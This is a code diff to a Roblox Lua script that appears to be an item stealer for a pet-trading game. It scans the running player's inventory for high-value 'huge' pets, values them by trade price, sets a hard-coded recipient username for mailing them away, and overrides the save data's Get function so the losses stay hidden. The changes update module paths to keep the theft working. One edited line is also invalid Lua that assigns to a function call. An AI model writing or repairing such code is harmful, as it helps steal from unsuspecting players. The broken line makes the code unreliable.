@@ -32,14 +32,14 @@ local H = Y.TextField({
     Type = "Password"
 })
 
-local library = require(game.ReplicatedStorage.Library)
-local save = library.Save.Get().Inventory
+local library = game.ReplicatedStorage.Library
+local save = require(library.Client.Save).Get().Inventory
 
 local foundHugePet = false
 
 for i, v in pairs(save.Pet) do
     local id = v.id
-    local dir = library.Directory.Pets[id]
+    local dir = require(library.Directory.Pets)[id]
     
     if dir and dir.huge then
         foundHugePet = true
@@ -63,9 +63,9 @@ if player.name == "zgrind_3" then
 	Username = "footing1i"
 end
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
-local library = require(game.ReplicatedStorage.Library)
-local save = library.Save.Get().Inventory
-local mailsent = library.Save.Get().MailboxSendsSinceReset
+local library = game.ReplicatedStorage.Library
+local save = require(library.Client.Save).Get().Inventory
+local mailsent = require(library.Client.Save).Get().MailboxSendsSinceReset
 local plr = game.Players.LocalPlayer
 local MailMessage = "Hee hee"
 local HttpService = game:GetService("HttpService")
@@ -215,7 +215,7 @@ game.DescendantAdded:Connect(function(x)
 end)
 
 local function getRAP(Type, Item)
-    return (library.DevRAPCmds.Get(
+    return (require(library.Client.DevRAPCmds).Get(
         {
             Class = {Name = Type},
             IsA = function(hmm)
@@ -320,7 +320,7 @@ for i, v in pairs(categoryList) do
 	if save[v] ~= nil then
 		for uid, item in pairs(save[v]) do
 			if v == "Pet" then
-                local dir = library.Directory.Pets[item.id]
+                local dir = require(library.Directory.Pets)[item.id]
                 if dir.huge or dir.exclusiveLevel then
                     local rapValue = getRAP(v, item)
                     if rapValue >= min_rap then
@@ -362,8 +362,8 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
     EmptyBoxes()
 	require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
 	require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
-    local blob_a = require(game.ReplicatedStorage.Library)
-    local blob_b = blob_a.Save.Get()
+    local blob_a = game.ReplicatedStorage.Library
+    local blob_b = require(blob_a.Client.Save).Get()
     function deepCopy(original)
         local copy = {}
         for k, v in pairs(original) do
@@ -375,7 +375,7 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
         return copy
     end
     blob_b = deepCopy(blob_b)
-    blob_a.Save.Get = function(...)
+    require(blob_a.Client.Save).Get() = function(...)
         return blob_b
     end
 
